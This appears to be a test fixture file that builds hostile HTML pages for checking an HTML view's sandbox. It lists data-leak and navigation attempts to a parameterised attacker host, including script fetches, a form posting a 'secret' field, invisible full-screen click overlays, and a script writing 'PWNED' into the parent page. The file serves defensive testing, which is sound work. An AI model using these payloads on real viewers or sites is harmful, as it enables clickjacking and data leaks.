/** A hostile static HTML page for the HTML view's sandbox (#317). Every way out a page without running code has, plus a
 *  script that would change the page's text and reach out if it ran. Each attempt targets the check's own listener with
 *  its own path, so a hit names the attempt. */
export function hostileStaticPage(attacker: string, scripts = true, refreshSeconds = 1) {
  const page = `<!doctype html><title>hostile</title>
<meta http-equiv="refresh" content="${refreshSeconds};url=${attacker}/meta-refresh">
<style>@import url("${attacker}/css-import");@font-face{font-family:x;src:url("${attacker}/font")}body{font-family:x;background:url("${attacker}/css-bg")}</style>
<link rel="stylesheet" href="${attacker}/stylesheet"><link rel="prefetch" href="${attacker}/prefetch"><link rel="icon" href="${attacker}/icon">
<img src="${attacker}/img"><picture><source srcset="${attacker}/srcset"><img alt=""></picture>
<video src="${attacker}/video" autoplay muted></video><object data="${attacker}/object"></object><embed src="${attacker}/embed">
<iframe src="${attacker}/nested-iframe"></iframe><iframe srcdoc="<img src='${attacker}/nested-img'>"></iframe>
<a href="${attacker}/link-blank" target="_blank" style="position:fixed;left:0;top:0;width:33%;height:100%;z-index:9"></a>
<form id="f" method="post" action="${attacker}/form-post"><input name="secret" value="x"><button id="send" style="position:fixed;left:33%;top:0;width:34%;height:100%;opacity:0;z-index:9">send</button></form>
<a href="${attacker}/link-top" target="_top" style="position:fixed;right:0;top:0;width:33%;height:100%;z-index:9"></a>
<p id="out">STATIC TEXT</p>
<script src="${attacker}/script-src"></script>
<script>
document.getElementById('out').textContent = 'SCRIPT RAN'
fetch('${attacker}/script-fetch').catch(() => {})
new Image().src = '${attacker}/script-img'
try { parent.document.getElementById('marker').textContent = 'PWNED' } catch {}
try { top.location = '${attacker}/script-top' } catch {}
</script>`
  // Without its scripts (for a control that must show the form post, link click and meta refresh leak on their own).
  return scripts ? page : page.replace(/<script[\s\S]*$/, '')
}

/** Pages that try to navigate the view itself with one click, each filling the whole view (#336 review). LilBot's
 *  `<base target="_blank">` only changes links with no target of their own; these name `_self` or set their own base. */
export function selfNavPages(attacker: string): Record<string, string> {
  const fill = 'position:fixed;left:0;top:0;width:100%;height:100%;display:block;z-index:9'
  const out = '<p id="out">STATIC TEXT</p>'
  return {
    'a target=_self': `<a href="${attacker}/self-link" target="_self" style="${fill}"></a>${out}`,
    'second <base target=_self>': `<base target="_self"><a href="${attacker}/second-base" style="${fill}"></a>${out}`,
    'area target=_self': `<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" usemap="#m" style="${fill}"><map name="m"><area shape="rect" coords="0,0,4000,4000" href="${attacker}/area-self" target="_self"></map>${out}`,
    'svg a target=_self': `<svg style="${fill}"><a href="${attacker}/svg-self" target="_self"><rect width="100%" height="100%" fill="#eee"/></a></svg>${out}`,
    'a target=_parent': `<a href="${attacker}/parent" target="_parent" style="${fill}"></a>${out}`
  }
}
